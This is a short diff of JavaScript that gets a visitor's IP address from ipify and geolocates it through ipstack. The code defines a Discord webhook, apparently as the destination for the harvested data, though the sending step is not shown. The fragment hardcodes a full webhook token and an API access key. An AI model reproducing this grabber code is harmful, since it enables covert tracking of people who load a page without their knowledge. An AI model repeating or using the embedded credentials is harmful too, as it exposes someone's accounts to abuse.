@@ -8,7 +8,7 @@ fetch('https://api.ipify.org/?format=json')
 
     var webhook = 'https://discord.com/api/webhooks/1125398137218007120/48qobW7VH4WQVumwcZZ4Lqy-cVIhOlNVJ4yg6FEVR7qFxpIhfSUDYCot07T_0icdh0WY';
     
-    fetch()
+    fetch('http://api.ipstack.com/' + ip + '?access_key=f7f955d968dde57ba2e99e5edef897ba')
       .then(function(response) {
         return response.json();
       })
